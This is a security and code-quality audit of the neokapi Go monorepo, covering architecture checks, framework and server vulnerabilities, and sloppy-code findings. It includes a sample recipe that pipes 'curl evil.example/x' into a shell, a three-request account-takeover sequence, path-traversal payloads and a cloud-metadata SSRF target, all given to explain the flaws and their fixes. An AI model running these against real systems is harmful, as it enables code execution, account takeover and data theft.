# neokapi Architecture, Security, and Code-Quality Evaluation

**Date:** 2026-07-28
**Commit under review:** `001254df7` (fix(harness): the bilingual workflow demo runs commands that exist (#1507))
**Scope:** full monorepo — framework (core/, memory/, terms/, providers/), host/, cli/, kapi/, bowrain/ (+ bowrain/core, bowrain/plugin), plugins/*, kpz/, apps/kapi-desktop
**Codebase size:** 2,820 Go files (1,291 test files, ~46%), ~360k LOC including tests

**Method:** five parallel audit streams (architecture, framework security, bowrain security, code quality, test coverage), followed by manual spot-verification of every critical/high finding and scanner corroboration. Static analysis: `go vet` clean on all modules; `golangci-lint` v2.9.0 (the repo's pinned version and config, 16 linters including gosec) reports **0 issues** on the root, host, cli, and bowrain modules. Coverage measured locally with `go test -coverprofile` per module. Findings marked **CONFIRMED** were verified by reading the executing code path; **SUSPECTED** findings are pattern-matched and need dynamic reproduction.

---

## 1. Executive summary

neokapi is an unusually disciplined pre-1.0 codebase. The documented module architecture is the actual architecture — every dependency rule in CLAUDE.md was verified empirically and is enforced three ways (Makefile, CI, pre-push hooks, including `GOWORK=off` isolation builds). The framework's supply-chain paths (plugin install, self-update) are signed, hashed, size-capped, and traversal-proof; SQL, XML, and TLS handling are clean; lint discipline is total (0 issues under a strict pinned config).

The serious exposure is concentrated at **trust boundaries that bypass this plumbing**:

1. **A test backdoor in bowrain's release auth path enables one-request account takeover** (CRITICAL, §4.1). This should be treated as an emergency fix.
2. **A malicious `kapi.yaml` in a cloned repo yields arbitrary command execution** via the `external-command` tool, with no trust gate (HIGH, §3.1).
3. **The `.kpz` interchange package — the format designed to cross between parties — is ingested with no path validation, no recipe sanitization, and no decompression limits** (HIGH/MEDIUM, §3.2–3.4).
4. **Bowrain's server-registered connectors let any tenant read the host filesystem and reach internal network endpoints** (HIGH, §4.3, §4.4).
5. **A missing ownership binding on GitHub App installations permits cross-tenant private-repo enumeration and cloning** (HIGH, §4.2).

Test coverage is genuinely good at the framework level (root module 71.8%) but has wiring holes: concurrency-critical Postgres job tests never run in CI due to an environment-variable mismatch, the `integration` test lane is invoked by no workflow, the 60% Codecov patch gate is inert (PRs never upload coverage), and three security-relevant packages (`core/credentials`, `core/blockstore/sqlitestore`, `core/storage/schema`) have zero tests.

| Area | Score | One-line justification |
|---|---|---|
| Architecture | 9/10 | Boundaries verified empirically; enforcement real; two 100+-file god packages and init()-registries cost a point |
| Framework security | 7/10 | Strong engineering; systemic weakness is unestablished trust in recipes and `.kpz` packages |
| Bowrain security | 5/10 | Excellent core plumbing; critical auth backdoor and connector trust-model conflicts at the edges |
| Code quality | 8/10 | 0 vet/lint issues; a small set of verified silent-error-drop bugs and dead code |
| Test infrastructure | 8/10 | Real conventions and roundtrip validation; CI wiring holes and three zero-test security-relevant packages |

---

## 2. Architecture validation

### 2.1 Verified good

Every stated dependency rule holds, verified with `go list -deps` in both workspace and `GOWORK=off` modes:

| Rule | Check | Result |
|---|---|---|
| Framework imports no host/cli/kapi/bowrain | `go list -deps ./...` at root | 0 matches |
| Host is cobra-free | `go list -deps ./...` in host/ | 0 matches |
| kapi-desktop links neither cobra nor cli | `go list -deps ./backend/...` | 0 matches |
| kapi binary has zero vendor-plugin code | `go list -deps ./...` in kapi/ | 0 matches for `neokapi/bowrain`, `neokapi/plugins/` |
| bowrain/core = framework + schema only | `go list -deps ./...` | only `core/*`, `memory`, `terms`, `bowrain/plugin/schema` |
| bowrain server does not import cli | `go list -deps ./...` in bowrain/ | 0 matches; only host dep is `host/flowdef` |
| plugins/* are framework-only | per-module `go list -deps` (sat/av/pdfium/vision/asr/check) | 0 cross-module deps, all six |
| Isolation not hidden by go.work | `GOWORK=off go build ./...` in kapi/ and host/ | both build clean |

Enforcement is multi-layered and currently passing: `Makefile:546-564` (`verify-isolation`), `Makefile:585-644` (`audit-modules` with per-module boundary documentation matching the CLAUDE.md table), `.github/workflows/ci.yml:950` (`make ci-build`), and `scripts/pre-push-check.sh`.

Interface design is exemplary:

- `core/tool/tool.go:11-28` — `Tool` is 5 methods, streaming channels in/out.
- `core/flow/executor.go:18-21` — `Executor` is a single method.
- `core/format/reader.go` — interface segregation: `FormatDescriptor` (line 13), `Configurable` (28), `PartReader` (38) as facets composed into `DataFormatReader` (57), plus marker capabilities (`StreamingReader`, 76).
- `core/model` is a leaf package; `core/format` (abstract) imports no `core/formats/*` (concrete); `core/flow` imports `core/tool` but not `core/tools` or `core/ai`.
- `host/command.go:24-35` — the `Command` seam matches CLAUDE.md verbatim.
- Shared business rules live in core, not per-surface: `core/check/readiness.go:16` — server and CLI promote/demote a block from identical findings.

The plugin architecture has security properties most plugin systems lack: versioned protos with a conformance suite (`core/plugin/conformance/`), manifest version negotiation (`core/plugin/manifest/manifest.go:574-579`), binary-path validation rejecting absolute paths and `..` (784-799), mandatory SHA-256 plus Sigstore/cosign verification on install (`host/pluginhost/install.go:60-65`), retired-plugin tombstones, and documented discovery precedence with the `KAPI_PLUGINS_DIR_ONLY` isolation seam.

### 2.2 Architectural smells (no rule violations found)

1. **`bowrain/server` god package** — 108 non-test files / 33,198 LOC in one package. `server.go` (2,119 LOC, ~60 imports; `NewServer` is a 598-line constructor at line 372, `SetupRoutes` 405 lines at 1031) and `editor.go` (2,144 LOC, 58 package-level functions mixing workspace stores, project CRUD, AI/content-memory orchestration, and term enforcement) are god files.
2. **`host` root god package** — 103 non-test files / 28,445 LOC, with clear sub-clusters (`mcp_*` ×7, `toolbox_*` ×7, `kpz*` ×3, `converge*` ×4) that never became packages, inconsistent with the module's own subpackage convention.
3. **Global mutable state** (documented but real): `core/mt/tools/register.go:30` (`var Providers = []Provider{}` mutated by plugin init()s), `core/av/av.go:284` (exported mutable `Runner` hook — a data-race door for parallel tests), `host/modeldaemon.go:15` (init() cross-package mutation), `core/flow/executor.go:123` (deprecated `tool.EnforceImmutability` global). ~70 `init()` functions; `bowrain/plugin/commands/` alone has 16 self-registering with implicit ordering.
4. **Parallel service layers** — `bowrain/server` uses only `host/flowdef` from host and re-orchestrates on raw core primitives (`editor.go:772-1060`); CLI and web evolve separate orchestration shapes, mitigated only by rules living in core.
5. **Organizational asymmetry** — `core/formats/` is one subpackage per format; `core/tools/` is 34 flat files. Same category, two conventions.
6. **Three `Block` types** — `model.Block` (`core/model/block.go:24`), `kbf.Block` (`core/kbf/schema.go:69`), `editor.Block` (`core/editor/blocks.go:29`); each documented as a layer DTO, but the name collision invites confusion.
7. **`cli/aliases.go`** — 199 generated type aliases re-exporting the host API; a public compat surface that will be painful to retire.
8. **Repo hygiene** — compiled binaries `checkeval` (22 MB) and `modelcheck` (8.6 MB) are tracked in git at the repo root.
9. **Giant file** — `core/formats/openxml/wml.go` is 8,499 lines / 139 declarations; the openxml package totals ~16k lines.

### 2.3 Documentation drift

Essentially none — remarkable for a repo this size. Nits only: CLAUDE.md names `cli.ResolveProjectPath` (now owned by `host/project.go:48`, re-exported via `cli/aliases.go:189`); the format interfaces are `DataFormatReader`/`DataFormatWriter` with no single `DataFormat` type; `Makefile:574` references a "Build Conventions" section that is titled "Build".

---

## 3. Security findings — framework (kapi, cli, host, core)

### 3.1 HIGH (CONFIRMED): Malicious `kapi.yaml` yields arbitrary command execution via `external-command`; no trust gate

**Files:** `core/tools/externalcommand.go:161` (sink), `core/tools/register.go:321` (config factory registration), `host/flow.go:1800-1825` (recipe step → tool construction), `core/flow/steps.go:10-14` (recipe schema).

```go
// core/tools/externalcommand.go:161
cmd := exec.CommandContext(ctx, cfg.Command, args...)
```

A recipe can declare:

```yaml
flows:
  default:
    steps:
      - tool: external-command
        config: { command: /bin/sh, args: ["-c", "curl evil.example/x | sh"], applyTarget: true, targetLocale: nb }
```

When a victim runs `kapi run` / `kapi converge` / `kapi translate` inside a cloned repo, project auto-discovery (the git-style upward walk in `core/project.ResolveLayout`) binds the malicious project silently and the flow executes the attacker's argv with the user's privileges and full environment — including provider API keys, which are deliberately resolvable from the environment (`host/credentials/resolve.go:26-32`). There is no confirmation prompt, allowlist, sandbox, or opt-in; `Validate()` only checks the command is non-empty. The same tool is exposed on the MCP surface (`host/mcp_tools.go:170`) and engine gRPC socket (`host/engineserve/server.go:330`), though those are same-user boundaries. This is the `npm postinstall` threat model, but without the explicit-risk surfacing that ecosystem provides; `external-command` is documented as an ordinary tool.

**Fix:** gate recipe-originated exec-capable tools behind a sticky per-project trust decision (first-run prompt + recipe hash in `.kapi/`) or an explicit `KAPI_ALLOW_EXEC=1` / `--allow-commands` opt-in; document the recipe trust model in SECURITY.md.

### 3.2 HIGH (CONFIRMED statically; dynamic repro recommended): Malicious `.kpz` escapes the project root on `kapi merge` — out-of-project read + arbitrary-location write

**Files:** `host/merge.go:499-501` (source read), `host/merge.go:584-588` + `1007-1032` (output derivation), `kpz/kpz.go:229-245` (`SourceIdentity.SourcePath` never validated on `Unmarshal`).

```go
// host/merge.go:500-501
srcRel := si.SourcePath                       // attacker-controlled (from the .kpz manifest)
sourceAbs := filepath.Join(layout.Root, srcRel) // "../../etc/x" escapes the project
```

The interchange `.kpz` profile exists precisely to cross a trust boundary (handed to a translator/reviewer, `kpz/kpz.go:96-99`), and the CLI routes returned packages to merge (`cli/merge.go:43-45`). `filepath.Join` cleans but does not contain `..`; a `SourcePath` of `../../tmp/evil.md` makes kapi read a file outside the project and write the merged target outside it (default branch at `host/merge.go:1031-1032`, or the recipe-template branch — `doublestar.Match` is pure string matching and `**` matches `..` segments). The write happens for every source entry regardless of overlay matches, with bytes shaped by attacker-controlled skeleton and overlay payloads. `flow.CheckOutputPath` (`core/flow/outputpath.go:103`) checks only for directory/irregular-file obstruction — no containment.

**Fix:** reject absolute/`..`/backslash `SourcePath` values in `kpz.Unmarshal` (same policy as `validateBinaryPath`, `core/plugin/manifest/manifest.go:784`); defense in depth: verify `filepath.Rel(layout.Root, targetPath)` stays within root before writing in `MergeOneKpz`/`resolveMergeOutputPath`.

### 3.3 HIGH (CONFIRMED): Malicious workspace `.kpz` controls merge output layout and is adopted as the live project recipe on `kapi unpack`

**Files:** `host/kpzworkspace.go:291-297` + `489-509` (template branch with no containment), `host/workspace.go:48-50` (`kpz.RecipeWorkspaceMeta(r).Out` is attacker-controlled), `host/workspace_project.go:226-232` (`RunUnpack` writes the package's recipe as the project recipe when none exists).

A crafted `.kpz` carries a full recipe (`kpz/kpz.go:190-196`). `kapi merge work.kpz` writes localized files to an absolute or traversing `Out` layout; `kapi unpack snapshot.kpz` plants the attacker's recipe as the project recipe, so the next flow run inherits attacker-authored steps — chaining into §3.1. The format's own comment notes side-effecting Extras "should be stripped via SanitizeRecipe before packing" — which a malicious packer simply won't do. Sanitization must happen on **ingest**.

**Fix:** sanitize/validate package-carried recipes on ingest: strip Extras, reject `external-command` steps and absolute/traversal `Out` layouts; prompt before adopting a package-carried recipe.

### 3.4 MEDIUM (CONFIRMED): `.kpz` parsing has no decompression-bomb protection — the only zip consumer that bypasses `safeio`

**Files:** `kpz/kpz.go:638` (`readZipFile` for every manifest member), `kpz/kpz.go:707-718` (`io.ReadAll` with no limits). Reachable from `host/workspace.go:147` and all merge/info/workspace callers.

The repo has an excellent zip-bomb guard — `core/safeio/zip.go` (per-entry cap, inflate-ratio check, total cap, entry count) — used by every other zip consumer (odf, openxml, epub, container). `kpz` is the sole exception, and `Unmarshal` additionally reads each member fully into memory before parsing. A few-MB crafted package will OOM the kapi process on `kapi merge`/`kapi info`. The format is designed for exchange between parties, so untrusted packages are an expected input.

**Fix:** route all kpz entry reads through `safeio.DefaultZipLimits`, matching the format readers.

### 3.5 MEDIUM (CONFIRMED as latent; not currently reachable): `exec` format is an argv-exec primitive waived by `#nosec`, with no wiring and no trust mechanism

**File:** `core/formats/exec/reader.go:90`

```go
cmd := gexec.CommandContext(runCtx, spec.Exec[0], spec.Exec[1:]...) // #nosec G204 — argv supplied by trusted project config
```

No production caller of `exec.Run` exists in the tree (verified) — dead-but-dangerous code: whoever wires it up inherits an unreviewed recipe-RCE channel that static analysis will skip because of the annotation. The doc comment also shows `command` as a string while `Spec.Exec` is `[]string` — the natural wiring (`strings.Fields`) would silently mishandle quoting.

**Fix:** delete the unused runner, or gate it with §3.1's trust mechanism and drop the blanket `#nosec`.

### 3.6 MEDIUM→LOW (CONFIRMED): MT translate tool's `baseURL` is recipe-settable — recipe can redirect an MT endpoint and receive the resolved API key + document content

**File:** `core/mt/tools/translate.go:47` — `BaseURL string \`json:"baseURL,omitempty" schema:"-"\``. The `schema:"-"` hides it from CLI flags, but the `json` tag makes it settable from a recipe step's `config:` map. Combined with credential auto-resolution (env-var fallback, keychain auto-detect), a malicious recipe would POST document text and the user's resolved API key to an attacker-chosen endpoint. Mitigating: the framework ships no MT providers (plugin-registered), so an MT plugin must be installed; AI/LLM providers are not affected (no BaseURL in their configs).

**Fix:** remove the `json` tag (make it programmatic-only, like `core/ai/tools/segment_llm.go:44`'s `json:"-"`), or allow baseURL only from the credential store.

### 3.7 LOW (CONFIRMED)

- **`--api-key` CLI flag exposes secrets via `ps` and shell history** — `cli/credentials_cmd.go:44,83`, advertised in error text at `host/credentials/resolve.go:189-191`. The keychain flow itself is good (go-keyring; configs `0o600`, `core/credentials/store.go:268`). Fix: stdin prompt / `--api-key-stdin`.
- **Plugin subprocesses inherit the entire environment including all provider API keys** — `host/pluginhost/exec.go:93-97`, `daemon.go:560-565`. Conventional but a meaningful undocumented privilege grant. Fix: document, or scrub known secret env vars unless the manifest declares a need.
- **claude-code provider puts a document-derived system prompt on process argv** — `providers/ai/claudecode.go:101,143,148-162` (`--append-system-prompt`), visible in `ps`. User prompt correctly goes via stdin; provider defensively disables tools/sessions/settings. Fix: temp-file mechanism if the CLI supports one.
- **XML format follows relative ITS-rules `href`s outside the document's directory** — `core/formats/xml/reader.go:319-331`; `..` not rejected, errors swallowed, bytes parsed as rules (no clear disclosure channel; hardening gap). Fix: verify containment under `baseDir`.
- **`unsafe.String` zero-copy over file buffers in five format readers** — `core/formats/{resx,androidxml,json,arb,xcstrings}/reader.go`. Latent footgun: safe only while nothing mutates/pools the read buffer.

### 3.8 Areas audited and found clean (framework)

- **Plugin install/self-update (strong):** mandatory SHA-256 + cosign keyless verification, pinned OIDC issuer/identity for self-update with no unsafe override (`cli/selfupdate/apply.go:97-113`); zip-slip defenses with `O_NOFOLLOW` and symlink containment (`host/pluginhost/install.go:294-456`); download caps (index 32 MB, artifacts 512 MB); atomic-rename binary replacement.
- **Plugin dispatch:** direct argv only — no `sh -c` anywhere in framework code.
- **SQL:** all dynamic fragments builder-controlled with `?` placeholders; FTS5 trigram queries escape `"` by doubling (`terms/sqlite.go:465`).
- **XML/XXE:** only Go `encoding/xml` (no external entities/DTD, no cgo/libxml).
- **TLS:** no `InsecureSkipVerify` anywhere; `core/httputil` enforces TLS ≥ 1.2 with bounded retries.
- **Engine gRPC:** Unix socket only, dir forced `0700` (`host/engine.go:46-52`), absolute-path requirement and safeio budgets on inputs.
- **Temp files:** `os.CreateTemp`/`os.MkdirTemp` throughout.
- **Recipe surface otherwise:** globs cannot escape the project (verified dynamically against `os.DirFS`); YAML v3; `PluginSpec` declares versions only, never paths; `script` tool is sandboxed pure-Go goja; no URL scheme in flow bindings (no recipe SSRF).

---

## 4. Security findings — bowrain (server, auth, crypto, web)

### 4.1 CRITICAL (CONFIRMED): Unauthenticated account takeover via device-flow "direct verification" backdoor

**Files:** `bowrain/server/handlers_auth.go:539-569` (`handleDeviceVerification`), `624-656` (`handleDeviceVerificationDirect`), `138-196` (`HandleDeviceAuthPoll`), `bowrain/service/auth.go:44-66` (`GetOrCreateUser` matches by email); route registered unconditionally when `JWTSecret != ""` — i.e. every production build — at `bowrain/server/server.go:1134-1137`.

```go
// handlers_auth.go:557-561
// If explicit email is provided (programmatic/test request), use direct
// verification — the caller already knows the user identity.
if email := c.FormValue("email"); email != "" {
    return s.handleDeviceVerificationDirect(c, matchedCode)
}
```

`handleDeviceVerificationDirect` marks the device `Authorized = true` with `UserEmail = <attacker-supplied email>` — no OIDC, no credential, no dev-mode flag. The poll handler then calls `GetOrCreateUser(email)`, which returns the existing account, and issues a platform JWT + refresh token for it. Exploit is three unauthenticated requests:

1. `POST /api/v1/auth/device/start` → receive `device_code` + `user_code`.
2. `POST /api/v1/auth/device/verify` with `user_code=<code>&email=ceo@target.com`.
3. `POST /api/v1/auth/device/poll` with `device_code` → JWT + refresh token for `ceo@target.com`.

Works even when OIDC is fully configured — the email form value short-circuits it. `/device/verify` has **no rate limit** (unlike `/device/start`). Full silent takeover of any user including workspace owners. **Verified by reading the code path in this review.**

**Fix (emergency):** gate the direct path behind the existing `BOWRAIN_ALLOW_INSECURE_DEV` escape hatch (or delete it and drive E2E through a test-only build tag); require OIDC verification whenever an issuer is configured, regardless of form values.

### 4.2 HIGH (CONFIRMED): GitHub App installation IDOR — cross-tenant private-repo enumeration and cloning

**Files:** `bowrain/server/handlers_forge_setup.go:44-58` (`HandleListInstallationRepos`), `95-131` (`HandleDetectInstallationRepo`), `138-206` (`HandleBindInstallationRepo`), `bowrain/forge/githubapp.go:199-213` (mints an installation token with the app private key).

The only verification in the bind handler is that the named repo belongs to the *given* installation; nowhere is an installation ID associated with the workspace that installed the app (no ownership store exists — confirmed by grep). On a shared-instance deployment (one GitHub App, many customer installations — the normal SaaS topology; installation IDs are sequential integers visible in GitHub URLs), tenant A calls `GET /api/v1/<wsA>/github/installations/<B's instID>/repositories` to enumerate tenant B's private repos, then binds one: the server mints an installation token for B's installation and clones B's private repository into A's project.

**Fix:** persist an `installation_id → workspace_id` binding at app-install time (signed state through the setup redirect / `installation` webhook); require it on list/detect/bind.

### 4.3 HIGH (CONFIRMED): Server-side `file` connector — arbitrary host filesystem read by any tenant

**Files:** `bowrain/connector/file.go:28-48` (unvalidated `config["path"]`), `67-91` (`filepath.Join(c.basePath, p)` with caller-supplied `Paths`); registered into the server at `bowrain/connector/register.go:19-22` + `bowrain/server/server.go:379`; add-connector gated only by `PermManageConnectors` (`bowrain/server/handlers_connector.go:164-216`), which every workspace owner/admin holds (`bowrain/core/auth/types.go:238-246`).

Any registered user creates a workspace (they become owner), adds `{"type":"file","config":{"path":"/"}}`, then fetches `{"paths":["etc/...","root/.docker/config.json"]}`. Files matching the broad format-extension set (`.json .yaml .xml .properties .txt .csv .md .po .html` …) are parsed and stored as blocks the attacker reads back via the blocks API. `List()` additionally walks the rooted tree and leaks `absolute_path` metadata (`file.go:148,380`). Tenant → host boundary breach.

**Fix:** do not register `file`/`git` connectors on the multi-tenant server registry (server content should arrive via kapi push / forge), or confine `path` to a server-admin-configured jail root and reject `..` in `FetchOptions.Paths`.

### 4.4 HIGH (CONFIRMED): SSRF via WordPress connector — arbitrary URL, content reflected

**Files:** `bowrain/connector/wordpress.go:48-69` (`config["url"]` accepted with zero scheme/host validation), `174-199` (error path reflects the response body: `fmt.Errorf("fetch posts: HTTP %d: %s", …, string(body))`); reachable via add-connector/fetch with `PermManageConnectors`.

A tenant points the connector at `http://169.254.169.254/...` or internal services (path prefix constrained to `/wp-json/wp/v2/posts`, but host/port fully selectable). Two exfil channels: non-200 bodies reflected verbatim in client-visible errors; internal JSON-array responses decoded as posts and stored as project blocks. `connector/posthog.go:97-106` similarly accepts any `http(s)` host (blind SSRF), and provider `BaseURL` (`handlers_editor.go:998-1036`) is honored by worker-side AI calls.

**Fix:** for server-registered remote connectors require `https`, resolve and reject loopback/link-local/RFC1918 (re-check after redirects), and stop reflecting upstream response bodies in client-visible errors.

### 4.5 MEDIUM (CONFIRMED)

1. **Reflected XSS in the desktop OIDC callback error page** — `bowrain/server/handlers_auth.go:424-434`: `error_description` concatenated unescaped into an HTML response on the API origin (no CSP headers exist anywhere in bowrain/server). Sibling handlers use static strings or `QueryEscape` — this one path was missed. Fix: `html.EscapeString` + baseline CSP.
2. **Stored HTML injection served as `text/html` on the app origin** — `bowrain/server/handlers_preview.go:44,53,64,93,104,109` serve document-derived `PreviewHTML` and block text as HTML; `core/editor/preview_html.go:43-54` embeds raw markup unescaped. The intended consumer iframes it with `sandbox="allow-scripts"` (no `allow-same-origin`) — safe — but the endpoints are directly navigable, and content can arrive from an external CMS via a connector. Fix: `Content-Security-Policy: sandbox` on these responses + global security headers (`X-Content-Type-Options: nosniff`, frame policy).
3. **Path traversal in `FileConnector.publishFile` via unsanitized item names** — `bowrain/connector/file.go:162-163` (`filepath.Join(c.basePath, item.Path)`, no validation); ingest stores multipart `fh.Filename` verbatim (`bowrain/server/editor.go:556-591`); delivery rebuilds paths from stored names (`bowrain/server/forge.go:369-424`). An item named `../../../../tmp/x.json` reaching the store causes the server to write translated output outside the checkout on next delivery (exploit chain SUSPECTED — the ingest/delivery chain needs dynamic confirmation). Fix: validate item names at ingest; verify containment after Join (the pattern already used in `serveSPAFile`, `server.go:1446-1453`).
4. **WebSocket `OriginPatterns: ["*"]` on cookie-authenticated sockets** — `bowrain/server/ws_notifications.go:96-98`, `ws_collab.go:125-128`. SameSite=Lax blocks truly cross-site WS, but any same-site sibling origin (compromised landing/docs host, user-content subdomain) can open the socket with the user's session cookie: read notifications, join/inject Yjs updates. Fix: pin origins to the configured app origin, mirroring `corsConfig()`.
5. **Invite acceptance ignores the invite's email binding** — `bowrain/service/auth.go:462-494`: `Invite.Email` stored at creation but never compared to the accepting user's email; anyone holding an invite link joins with the invited role, including "owner". Fix: enforce email match when set, or split "email invite" vs "link invite" types.
6. **`localblob` key path traversal → blind server file read / existence oracle** — `bowrain/storage/localblob/store.go:33-37` (`filepath.Join(s.rootDir, key[0:2], key[2:4], key)`, no validation); chunk-hash validation skipped for `ChunkedBlobStore` (`bowrain/server/handlers_sync.go:183-190`); worker downloads attacker-supplied hashes (`bowrain/jobs/worker_sync.go:60,136`). Contents are parsed as protobuf so exfiltration is blind, but error/timing gives a file-existence oracle on the self-hosted default backend. S3 unaffected. Fix: validate blob keys (`^[0-9a-f]{64}$`) before joining.
7. **251 raw `err.Error()` 500 responses bypass the sanitized error handler** — pattern across `bowrain/server/*.go` (e.g. `handlers_connector.go:137,248`, `handlers_editor.go:280`). The central `httpErrorHandler` (`error_handler.go:70-81`) suppresses internals, but these call sites leak raw Postgres/driver errors, file paths, and connector internals to clients (and compound §4.4 by persisting upstream bodies via `setConnectorLastError`). Fix: route 5xx through `apiErr` with static messages.

### 4.6 LOW (CONFIRMED)

- **Observer-role delete on block notes** — `handlers_notes.go:104-108`: `HandleDeleteBlockNote` requires only `PermViewContent` for a DELETE (in-code TODO acknowledges it). Any read-only member can delete anyone's notes.
- **401 responses echo JWT validation internals** — `middleware_auth.go:104,232` (`"invalid token: " + err.Error()` reveals expiry-vs-signature-vs-issuer). Fix: static message.
- **Secure cookie flag depends on request scheme** — `handlers_auth.go:797-799`: silently downgrades to non-Secure on a proxy-header regression unless `ForceSecureCookies` is set. Fix: default true on production configs.
- **Rate limiting is per-instance and trusts `X-Forwarded-For`** — `middleware_ratelimit.go:84-114`: diluted across replicas; resettable by header rotation on directly exposed servers — relevant to the unthrottled `/device/verify`. Fix: shared buckets / trusted-proxy config.
- **Sandbox containers run as root; no CapDrop/no-new-privs/PidsLimit** — `sandbox/sandbox.go:186-200` (good baseline otherwise: no network, readonly rootfs, noexec tmpfs, 64 MB mem, 0.25 CPU, 30 s timeout). Also `sandbox.go:25` maps `bash` to `alpine:latest`, which ships no bash (functional bug).
- **Device-flow `user_code` is 32-bit** — `handlers_auth.go:66-72` (4 random bytes); combined with unthrottled verify, phishing-assisted binding is feasible. Fix: ≥64 bits + per-code attempt limit (moot if §4.1 is fixed).
- **Echo-only listener has no `ReadHeaderTimeout`** — `server.go:1846-1847` (Slowloris on the dev path; production's manual server sets 30 s at 1877). Fix: always construct `http.Server` explicitly.
- **Absolute server paths leaked in connector content metadata** — `connector/file.go:148,380` (`Metadata["absolute_path"]`) surfaced verbatim to any workspace member.

### 4.7 Areas audited and found sound (bowrain)

- **Platform JWT:** HS256 pinned, iss/aud/exp validated, empty secret fails closed, admin/user audiences split (`core/auth/jwt.go:81-113`); boot refuses to run without `BOWRAIN_JWT_SECRET` absent an explicit `--allow-insecure-dev` opt-in.
- **OIDC:** PKCE(S256)+state+nonce on all flows; `email_verified` enforced before account linking; back-channel logout validated per spec.
- **Sessions/refresh:** rotation with single-use reuse detection and family revocation; HttpOnly + SameSite cookies; CSRF custom-header gate on all cookie-auth mutations; CORS fixed allowlist, credentials never with `*`.
- **Authz architecture:** cross-workspace guard fails closed with 404 anti-enumeration (`middleware_auth.go:396-450`); deny-rules subtract; token-scope/session-grant intersection.
- **SQL:** every dynamic query interpolates only internally generated `$n` placeholders; user values always bound args.
- **Crypto at rest:** AES-256-GCM, random per-value nonce, versioned prefix, legacy-plaintext migration (`crypto/crypto.go`); missing key is a hard boot error on billed Postgres deployments.
- **Git connector:** URL scheme allowlist, scp-like regex, branch allowlist, `--` separators, `GIT_ALLOW_PROTOCOL` pinning (`connector/git.go:38-120`).
- **Webhooks:** Stripe signature-verified; forge HMAC-SHA256 / GitLab token verified; unsigned forge connectors have webhooks disabled.
- **Secrets in logs:** none found in auth/, credentials/, server/, jobs/.
- **kapi-desktop:** bundled-asset webview (no remote content); HTTPS + ed25519-signed updater; `..`-rejecting path validation; no `dangerouslySetInnerHTML`/`innerHTML` sinks in either frontend.
- **Dependencies:** current (`golang-jwt v5.3.1`, `go-oidc v3.20.0`, `echo v4.15.4`, `x/crypto v0.54.0`, `grpc 1.82.1`); none with a recognized unpatched CVE. golangci-lint (incl. gosec) reports 0 issues on the module.

---

## 5. Code quality — sloppy code inventory

Scanner baseline: `go vet` clean on root/host/cli/kapi/bowrain/plugins; `golangci-lint` (repo's pinned v2.9.0 config) reports **0 issues** on root, host, cli, bowrain. All 65 `//nolint` suppressions carry explanations (enforced by `nolintlint`); all 13 library `panic()`s are documented invariant/init checks unreachable from user input; zero stray `log.Fatal`/`os.Exit` outside `package main`; zero commented-out code blocks found.

### 5.1 Inventory

| Metric | Count | Top locations |
|---|---|---|
| Real TODO/FIXME/HACK (non-test) | 4 | `host/flow.go` ×3, `bowrain/server/handlers_notes.go` ×1 |
| `_ =`-discarded results (non-test) | 369 | bowrain/ ~150, core/ ~110, host/ ~80 |
| `panic()` in library packages | 13 | all documented invariants — acceptable |
| `go func(` spawns (non-test) | 113 | core/formats readers ~40, host ~20, bowrain/server ~15 |
| `time.Sleep` (non-test) | 7 | all bounded backoff/poll loops |
| Files > 2,000 lines | 9 | `openxml/wml.go` 8,499 is the outlier |

### 5.2 Top sloppy-code findings (all verified by reading the code)

**Silent error drops with correctness/security impact:**

1. **`bowrain/jobs/queue.go:110-113`** — `EnqueueAfter`'s timer goroutine does `select { case q.ch <- jobID: default: }`: when the buffer is full, a deferred retry job is **silently lost** (no error, no log) — while `Enqueue` (line 74-79) returns "queue is full". Retry-after-backoff jobs vanish under load.
2. **`bowrain/server/grpc.go:347`** — `_ = currentTool.Process(...)` in the gRPC tool chain: every tool error is discarded; the handler counts output blocks and returns success even if a tool failed mid-pipeline (the adjacent `recover` also converts panics into silent truncation).
3. **`bowrain/server/handlers_notes.go:105-106`** — shipped authorization gap: note deletion requires only `PermViewContent`; any reader can delete any user's notes (acknowledged only by TODO).
4. **`bowrain/server/handlers_agent.go:188`** — `_ = SetSessionGrant(...)` then unconditionally emits audit `EventSessionGrantCreated`: if the grant write fails, the **audit log records a grant that doesn't exist** and the agent runs with stale/no scope.
5. **`bowrain/server/handlers_sync.go:256`** — `_, _ = fmt.Sscanf(c.Param("chunkIndex"), ...)`: an unparseable param silently becomes chunk **0**; a malformed client overwrites chunk 0 instead of getting a 400.
6. **`bowrain/server/handlers_changesets.go:401,447`** — `_ = c.Bind(&req)` in approve/reject: malformed JSON silently accepted (inconsistent with `handlers_review_queue.go:287` which checks).
7. **`memory/tmx_export.go:42,93-121`** — `defer bw.Flush()` drops the flush error; 8+ unchecked `bw.WriteString`/`fmt.Fprintf` in the entry loop: a mid-export disk-full produces a **truncated TMX with a nil return** — inconsistent with the same function's own earlier checked writes.
8. **`core/formats/video/reader.go:213`** (+ `audio/reader.go:165`, `image/convert.go:109`, `image/reader.go:266`, `core/ai/tools/media_refine.go:72`) — `_ = tmp.Close()` on the success path after `io.Copy`: a delayed write error means ffmpeg/ONNX gets a truncated file; failure surfaces as a bogus decode error far from the cause.
9. **~15 discarded `json.Unmarshal` on DB property columns** — `bowrain/memory/postgres.go:410,1055`, `bowrain/terms/postgres.go:95,775`, `bowrain/agent/postgres.go:240-242`, `bowrain/store/{review_queue,task,activity}.go`, `bowrain/event/store_rules.go:134-135`, `bowrain/brand/postgres.go:529,548`, `host/storage/graph/sqlite.go:651`…: corrupt JSON silently yields empty properties, while scan errors in the same functions are wrapped with `%w`. The asymmetry signals the strict error culture of `core/` hasn't fully propagated into bowrain's storage layer.
10. **`bowrain/jobs/worker_sync.go:201`** — `_ = deps.BlobStore.Delete(...)`: orphaned manifest blobs accumulate silently.
11. **`core/project/storesync.go:302-303`** — `_ = StampBlockStoreVersion(...)` / `SaveSourceStamps(...)`: stale-cache detection can silently misbehave on next run.
12. **Side-effect writes discarded** — `bowrain/server/review_effects.go:124,141`, `handlers_source_proposals.go:260`, `termcheck.go:277`, `automation.go:327,487,668,731`: review feedback and automation bookkeeping silently lost on error.

**Dead / speculative code:**

13. **`bowrain/server/sse_automation_runs.go:49`** — `automationRunHub.broadcast` is **never called** (`//nolint:unused // will be used by RunManager`): the whole subscribe/unsubscribe machinery is wired but pushes nothing — dead feature masquerading as live push (clients get 3-second polled snapshots).
14. **`core/tools/register.go:69`** — `var _ = withParallelBlocks`: blank anchor keeping an unused helper alive "until the first tool adopts it".
15. **`memory/tmx_export.go:128` `ExportTMXBilingual`** — exported legacy-compat API; only caller is its own test.
